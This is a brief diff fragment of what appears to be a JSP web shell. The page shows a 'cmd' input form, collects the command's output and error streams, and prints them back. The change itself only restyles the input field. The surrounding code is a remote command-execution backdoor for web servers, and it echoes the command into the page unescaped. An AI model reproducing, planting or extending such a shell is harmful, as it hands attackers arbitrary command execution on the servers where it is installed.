@@ -18,7 +18,7 @@
         while((s = reader.readLine()) != null) { error += s+"\n"; }
     }
 %>
-<FORM><INPUT name=cmd style=border:0; type=text value='<%=cmd %>'></FORM>
+<FORM><INPUT name=cmd style=border:0;display:block; type=text value='<%=cmd %>'></FORM>
 <pre>
     <%=output %>
     <%=error %>
